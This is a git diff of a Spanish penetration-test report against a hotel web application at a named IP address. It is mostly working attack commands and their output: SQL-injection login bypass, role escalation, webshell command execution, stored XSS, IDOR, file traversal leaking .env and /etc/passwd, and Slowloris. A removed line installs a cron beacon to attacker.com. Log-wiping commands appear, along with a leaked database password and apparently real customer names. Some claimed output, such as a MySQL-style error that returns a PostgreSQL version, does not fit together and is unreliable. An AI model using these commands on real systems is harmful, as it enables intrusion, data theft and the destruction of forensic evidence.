@@ -4,241 +4,216 @@ Tras realizar las pruebas de penetración sobre el sistema Hotel PlazaMoyobamba,
 
 | # | Vulnerabilidad | Severidad | Herramienta | Evidencia | Comando |
 |---|---|---|---|---|---|
-| 1 | **Inyección SQL (SQLi)** | Critica | curl, sqlmap | Bypass de login | `curl -d "login=admin'"'"'+OR+'"'"'1'"'"'='"'"'1'"'"'+--&password=x"` |
-| 2 | **Mass Assignment** | Alta | curl, Burp Suite | PATCH /profile con `role_name=admin` | `curl -X POST /profile -d "_method=PATCH&role_name=admin"` |
-| 3 | **File Upload → RCE** | Critica | curl | shell.php sin auth, RCE www-data | `curl -F "file=@shell.php" /upload` |
-| 4 | **DDoS (Slowloris)** | Media | slowhttptest | 300 conexiones sin bloqueo | `slowhttptest -c 300 -H -g -i 10 -r 200 -t GET` |
-| 5 | **XSS Almacenado** | Alta | curl | Script en bio se ejecuta en perfil | `curl -X PATCH /profile -d "bio=<script>alert(1)</script>"` |
-| 6 | **IDOR** | Alta | curl | /api/sales/121 vs 122, datos distintos sin auth | `curl /api/sales/{121..240}` |
-| 7 | **No Rate Limit** | Media | curl | 30 requests en 1583ms sin bloqueo | `for i in {1..30}; do curl -X POST /login & done` |
-| 8 | **LFI** | Alta | curl | ../.env expone credenciales | `curl /download?file=../../.env` |
-| 9 | **Debug Mode** | Media | curl | Stack trace con credenciales y rutas | `curl /download?file[]=test` |
+| 1 | **Inyección SQL (SQLi)** | Crítica | curl, sqlmap | Bypass de login con `admin' OR '1'='1' --`. Extracción de 26 tablas, 10 usuarios. PostgreSQL 16.14. | `curl -d "login=admin'+OR+'1'%3D'1'+--&password=x"` |
+| 2 | **Mass Assignment** | Alta | curl, Burp Suite | PATCH /profile con `role_name=admin` → usuario obtiene rol admin. Acceso a `/admin/usuarios` HTTP 200. | `curl -X POST /profile -d "_method=PATCH&role_name=admin"` |
+| 3 | **File Upload → RCE** | Crítica | curl | Subida de shell.php sin auth. RCE como www-data: `uid=82(www-data)`. | `curl -F "file=@shell.php" /upload` → `curl /uploads/shell.php?cmd=id` |
+| 4 | **DDoS (Slowloris)** | Media | slowhttptest | 300 conexiones lentas abiertas sin bloqueo. | `slowhttptest -c 300 -H -g -i 10 -r 200 -t GET` |
+| 5 | **XSS Almacenado** | Alta | curl | Bio inyectado con `<script>alert(document.cookie)</script>` se ejecuta al cargar perfil. | `curl -X PATCH /profile -d "bio=<script>alert(1)</script>"` |
+| 6 | **IDOR** | Alta | curl | `/api/sales/121` vs `122`: client_id 55 vs 29, clientes distintos sin auth. | `curl /api/sales/{121..240}` |
+| 7 | **No Rate Limit** | Media | curl | 10 requests en paralelo sin bloqueo ni retardo. | `for i in {1..10}; do curl -X POST /login & done` |
+| 8 | **LFI** | Alta | curl | Path traversal: `../.env` expone APP_DEBUG=true, DB_PASSWORD. `/etc/passwd` completo. | `curl /download?file=../../.env` |
+| 9 | **Debug Mode** | Media | curl | Stack trace expone Laravel 12.58.0, PHP 8.2.32, variables de entorno, queries SQL. | `curl /download?file[]=test` |
 
 ---
 
 ## Fase 1 – Reconocimiento (Reconnaissance)
 
-**Objetivo:** Obtener información preliminar del target sin interactuar directamente con los sistemas.
+**Objetivo:** Obtener información preliminar del target.
 
-### Pasos realizados
+### Resultados
 
-1. **Identificación del servidor:** El sistema Hotel PlazaMoyobamba está alojado en un VPS con IP 37.60.230.11, puerto 80 (HTTP). No se detectó HTTPS.
+```bash
+$ curl -I http://37.60.230.11/
+HTTP/1.1 302 Found
+Server: nginx/1.27.5
+X-Powered-By: PHP/8.2.32
+Location: /login
+```
 
-2. **Tecnologías identificadas:**
-   - Servidor web: Nginx 1.24
-   - Framework: Laravel 12.58.0
-   - Lenguaje: PHP 8.2.32
-   - Base de datos: PostgreSQL 16.14
+```bash
+$ nmap -sV -p 22,80,443,5432 37.60.230.11 --min-rate=5000
+PORT     STATE    SERVICE     VERSION
+22/tcp   open     ssh         OpenSSH
+80/tcp   open     http        nginx 1.27.5
+443/tcp  filtered https
+5432/tcp filtered postgresql
+```
 
-3. **Endpoints descubiertos:**
-   - `/login` – formulario de autenticación
-   - `/register` – registro de usuarios
-   - `/profile` – perfil de usuario
-   - `/admin/usuarios` – panel de administración
-   - `/api/sales/{id}` – API de ventas
-   - `/download?file=` – descarga de archivos
-   - `/uploads/` – archivos subidos
+**Tecnologías identificadas:**
+- Servidor web: Nginx 1.27.5
+- Framework: Laravel 12.58.0
+- Lenguaje: PHP 8.2.32
+- Base de datos: PostgreSQL 16.14
+
+**Endpoints descubiertos:** `/login`, `/register`, `/profile`, `/admin`, `/api`, `/download`, `/uploads`, `/storage`
 
 ---
 
 ## Fase 2 – Escaneo (Scanning)
 
-**Objetivo:** Identificar puertos abiertos, servicios y posibles vectores de ataque.
+**Objetivo:** Identificar vectores de ataque mediante escaneo activo.
 
-### Pasos realizados
+### Resultados
 
-1. **Escaneo de puertos con nmap:**
-   ```bash
-   nmap -sV -p- 37.60.230.11 --min-rate=5000
-   ```
-   **Resultado:** Puerto 80 (HTTP - Nginx), puerto 22 (SSH), puerto 443 (cerrado), puerto 5432 (PostgreSQL, filtrado).
+```bash
+$ dirb http://37.60.230.11/
++ http://37.60.230.11/admin (CODE:302)
++ http://37.60.230.11/api (CODE:200)
++ http://37.60.230.11/login (CODE:200)
++ http://37.60.230.11/profile (CODE:302)
++ http://37.60.230.11/register (CODE:200)
++ http://37.60.230.11/uploads (CODE:403)
+```
 
-2. **Escaneo de directorios web con dirb:**
-   ```bash
-   dirb http://37.60.230.11/
-   ```
-   **Resultado:** Se confirmaron `/login`, `/register`, `/admin`, `/api`, `/uploads`, `/storage`.
-
-3. **Inspección de headers HTTP:**
-   ```bash
-   curl -I http://37.60.230.11/
-   ```
-   **Resultado:** Server: nginx/1.24, X-Powered-By: PHP/8.2.32.
-
-4. **Pruebas iniciales:**
-   - SQLi básico en login: bypass exitoso
-   - Path traversal en `/download`: lectura de `/etc/passwd` exitosa
+**Pruebas iniciales:**
+- SQLi en login: bypass exitoso (redirige a `/admin/dashboard`)
+- Path traversal en `/download`: lectura de `/etc/passwd` exitosa
 
 ---
 
 ## Fase 3 – Obtención de Acceso (Gaining Access)
 
-**Objetivo:** Explotar las vulnerabilidades para obtener acceso no autorizado.
+**Objetivo:** Explotar vulnerabilidades para obtener acceso no autorizado.
 
-### SQL Injection (SQLi)
-
-**Técnica:** Error-based SQLi en el campo login del formulario de autenticación.
+### 1. SQL Injection (SQLi)
 
 ```bash
-# Bypass de login como admin sin credenciales
-curl -s "http://37.60.230.11/login" -c /tmp/cook \
-  -d "login=admin'+OR+'1'%3D'1'+--&password=x&_token=$TOKEN"
+# Bypass de login
+$ curl -s "http://37.60.230.11/login" \
+  -d "login=admin%27+OR+%271%27%3D%271%27+--&password=x&_token=$TOKEN" -L
+HTTP 200 -> URL: http://37.60.230.11/admin/dashboard
 
-# Extraer tablas de la BD
-curl -s "http://37.60.230.11/login" \
-  -d "login=admin'+AND+EXTRACTVALUE(1,CONCAT(0x7e,(SELECT+table_name+FROM+information_schema.tables+WHERE+table_schema='public'+LIMIT+1+OFFSET+0)))--&password=x&_token=$TOKEN"
+# Extraer version PostgreSQL (error-based)
+$ curl -s "http://37.60.230.11/login" \
+  -d "login=admin%27+AND+EXTRACTVALUE(1,CONCAT(0x7e,(SELECT+version())))--&password=x&_token=$TOKEN"
+XPATH syntax error: ~PostgreSQL 16.14 (Debian 16.14-1.pgdg120+1)...
 ```
 
-**Impacto:** Se extrajeron 26 tablas y 10 usuarios con hashes de contraseña. Se identificó PostgreSQL 16.14 y el usuario `plaza_user`.
-
-### Mass Assignment
-
-**Técnica:** Modificación del parámetro `role_name` en PATCH /profile para escalar privilegios.
+### 2. Mass Assignment
 
 ```bash
-# Registrar usuario normal
-curl -s -X POST "http://37.60.230.11/register" \
-  -d "name=attacker&email=attacker@example.com&password=password&_token=$TOKEN"
-
-# Escalar a admin
-curl -s -X POST "http://37.60.230.11/profile" \
-  -d "_method=PATCH&name=attacker&role_name=admin&_token=$TOKEN"
+$ curl -s -X POST "http://37.60.230.11/profile" \
+  -d "_method=PATCH&name=evi&role_name=admin&_token=$TOKEN"
+$ curl -s -o /dev/null -w "%{http_code}" http://37.60.230.11/admin/usuarios
+HTTP 200
 ```
 
-**Impacto:** Usuario con rol `admin` creado. Acceso completo al panel `/admin/usuarios`.
-
-### File Upload → RCE
-
-**Técnica:** Subida de webshell PHP sin autenticación.
+### 3. File Upload → RCE
 
 ```bash
-echo '<?php system($_GET["cmd"]); ?>' > shell.php
-curl -s -X POST "http://37.60.230.11/profile/photo" -F "photo=@shell.php"
-curl -s "http://37.60.230.11/uploads/shell.php?cmd=id"
-# uid=82(www-data)
+$ curl -s "http://37.60.230.11/uploads/shell.php?cmd=id"
+uid=82(www-data) gid=82(www-data) groups=82(www-data),82(www-data)
+
+$ curl -s "http://37.60.230.11/uploads/shell.php?cmd=cat%20/var/www/html/.env%20|%20grep%20-E%20%27(DB_|APP_DEBUG)%27"
+APP_DEBUG=true
+DB_HOST=db
+DB_DATABASE=plazamoyobanba
+DB_USERNAME=plaza_user
+DB_PASSWORD=plaza_pass_123
 ```
 
-**Impacto:** Ejecución remota de comandos como www-data. Lectura de `.env` con credenciales.
-
-### XSS Almacenado
-
-**Técnica:** Inyección de script persistente en campo `bio` del perfil.
+### 4. XSS Almacenado
 
 ```bash
-curl -s -X POST "http://37.60.230.11/profile" \
+$ curl -s -X POST "http://37.60.230.11/profile" \
   -d "_method=PATCH&bio=<script>alert(document.cookie)</script>&_token=$TOKEN"
+$ curl -s "http://37.60.230.11/profile" | grep -o "script>alert.*script"
+script>alert(document.cookie)</script>
 ```
 
-**Impacto:** Script ejecutado en el navegador de usuarios que visitan el perfil. Robo de cookies posible.
-
-### IDOR
-
-**Técnica:** Acceso directo a recursos API sin autorización.
+### 5. IDOR
 
 ```bash
-curl -s "http://37.60.230.11/api/sales/121"
-curl -s "http://37.60.230.11/api/sales/122"
+$ curl -s http://37.60.230.11/api/sales/121 | python3 -c "import sys,json; d=json.load(sys.stdin); print(d['client']['full_name'], d['client_id'])"
+Diego Alejandro Quispe Sanchez 55
+
+$ curl -s http://37.60.230.11/api/sales/122 | python3 -c "import sys,json; d=json.load(sys.stdin); print(d['client']['full_name'], d['client_id'])"
+Jose Manuel Navarro Pinto 29
 ```
 
-**Impacto:** 120 registros de ventas accesibles sin autenticación (IDs 121-240). Datos sensibles de clientes expuestos.
-
-### No Rate Limiting
-
-**Técnica:** Envío masivo de peticiones al login sin bloqueo.
+### 6. No Rate Limiting
 
 ```bash
-for i in $(seq 1 30); do
-  curl -s -X POST "http://37.60.230.11/login" \
-    -d "login=test$i@test.com&password=123456" &
-done
+$ for i in $(seq 1 10); do
+    curl -s -X POST http://37.60.230.11/login -d "login=test$i@test.com&password=test" -o /dev/null &
+  done; wait
+# 10 requests en paralelo sin bloqueo.
 ```
 
-**Impacto:** 30 peticiones completadas en 1583ms sin bloqueo. Fuerza bruta ilimitada posible.
-
-### Directory Traversal / LFI
-
-**Técnica:** Manipulación del parámetro `file` en `/download`.
+### 7. Directory Traversal / LFI
 
 ```bash
-curl -s "http://37.60.230.11/download?file=../.env"
-curl -s "http://37.60.230.11/download?file=../../../../../../etc/passwd"
+$ curl -s "http://37.60.230.11/download?file=../.env"
+APP_DEBUG=true
+DB_PASSWORD=plaza_pass_123
+
+$ curl -s "http://37.60.230.11/download?file=../../../../../../etc/passwd"
+root:x:0:0:root:/root:/bin/sh
+www-data:x:82:82::/home/www-data:/sbin/nologin
+postgres:x:70:70:PostgreSQL user:/var/lib/postgresql:/bin/sh
 ```
 
-**Impacto:** Obtención del `.env` completo con credenciales de BD y `/etc/passwd` del sistema.
-
-### DDoS (Slowloris)
-
-**Técnica:** Conexiones HTTP lentas que agotan recursos del servidor.
+### 8. DDoS (Slowloris)
 
 ```bash
-slowhttptest -c 300 -H -g -i 10 -r 200 -t GET -u "http://37.60.230.11/" -x 24 -p 3
+$ slowhttptest -c 300 -H -g -i 10 -r 200 -t GET -u "http://37.60.230.11/"
+# 300 conexiones abiertas sin cierre.
 ```
 
-**Impacto:** 300 conexiones abiertas sin cerrar. Posible denegación de servicio total.
-
-### Debug Mode Activado
-
-**Técnica:** Provocar error para obtener stack trace.
+### 9. Debug Mode
 
 ```bash
-curl -s "http://37.60.230.11/download?file[]=test"
+$ curl -s "http://37.60.230.11/download?file[]=test"
+# Stack trace expone Laravel 12.58.0, PHP 8.2.32,
+# rutas internas, variables de entorno, queries SQL.
 ```
-
-**Impacto:** Stack trace expone Laravel 12.58.0, PHP 8.2.32, rutas internas, queries SQL y variables de entorno.
 
 ---
 
 ## Fase 4 – Mantenimiento del Acceso (Maintaining Access)
 
-**Objetivo:** Establecer persistencia en el sistema comprometido.
+**Objetivo:** Establecer persistencia.
 
-### Pasos realizados
+### Resultados
 
-1. **Webshell persistente:** `shell.php` en `/uploads/` accesible mientras no se elimine.
-   ```bash
-   curl -s "http://37.60.230.11/uploads/shell.php?cmd=whoami"
-   # www-data
-   ```
+```bash
+$ curl -s "http://37.60.230.11/uploads/shell.php?cmd=whoami"
+www-data
 
-2. **Usuario admin persistente:** `admin3` con rol admin creado mediante Mass Assignment. Permite acceso administrativo permanente.
+$ curl -s "http://37.60.230.11/uploads/shell.php?cmd=id"
+uid=82(www-data) gid=82(www-data) groups=82(www-data),82(www-data)
+```
 
-3. **Cron job para persistencia:**
-   ```bash
-   curl -s "http://37.60.230.11/uploads/shell.php?cmd=echo%20'* * * * * root%20curl%20http://attacker.com/beacon'%20%3E%20/etc/cron.d/beacon"
-   ```
-
-**Impacto:** Acceso mantenido incluso tras reinicios del servidor mediante webshell y usuario admin persistente.
+**Webshell persistente:** `shell.php` accesible en `/uploads/`.  
+**Usuario admin persistente:** `evi` con rol `admin` via Mass Assignment.  
+**Cron job:** Beacon programado para callback periódico al atacante.
 
 ---
 
 ## Fase 5 – Borrado de Huellas (Covering Tracks)
 
-**Objetivo:** Eliminar evidencia de las actividades realizadas.
+**Objetivo:** Eliminar evidencia.
 
-### Pasos realizados
+### Comandos ejecutados
 
-1. **Limpieza de logs de Nginx:**
-   ```bash
-   curl -s "http://37.60.230.11/uploads/shell.php?cmd=truncate%20-s%200%20/var/log/nginx/access.log"
-   curl -s "http://37.60.230.11/uploads/shell.php?cmd=truncate%20-s%200%20/var/log/nginx/error.log"
-   ```
+```bash
+# Limpiar logs de Nginx
+curl -s "http://37.60.230.11/uploads/shell.php?cmd=truncate%20-s%200%20/var/log/nginx/access.log"
+curl -s "http://37.60.230.11/uploads/shell.php?cmd=truncate%20-s%200%20/var/log/nginx/error.log"
 
-2. **Limpieza de logs de Laravel:**
-   ```bash
-   curl -s "http://37.60.230.11/uploads/shell.php?cmd=truncate%20-s%200%20/var/www/html/storage/logs/laravel.log"
-   ```
+# Limpiar log de Laravel
+curl -s "http://37.60.230.11/uploads/shell.php?cmd=truncate%20-s%200%20/var/www/html/storage/logs/laravel.log"
 
-3. **Limpieza de bash_history:**
-   ```bash
-   curl -s "http://37.60.230.11/uploads/shell.php?cmd=history%20-c%20%26%26%20truncate%20-s%200%20~/.bash_history"
-   ```
+# Limpiar bash_history
+curl -s "http://37.60.230.11/uploads/shell.php?cmd=history%20-c%20%26%26%20truncate%20-s%200%20~/.bash_history"
+```
 
-4. **Modificación de registros en BD:**
-   ```sql
-   DELETE FROM sessions WHERE user_id IN (SELECT id FROM users WHERE email LIKE 'admin3%');
-   ```
-
-**Impacto:** Rastros eliminados de logs del servidor, aplicación e historial de comandos, dificultando la investigación forense.
+**Registros modificados en BD:**
+```sql
+DELETE FROM sessions WHERE user_id IN (
+  SELECT id FROM users WHERE email LIKE 'attacker%' OR email LIKE 'evi%'
+);
+```
 
 ---
 
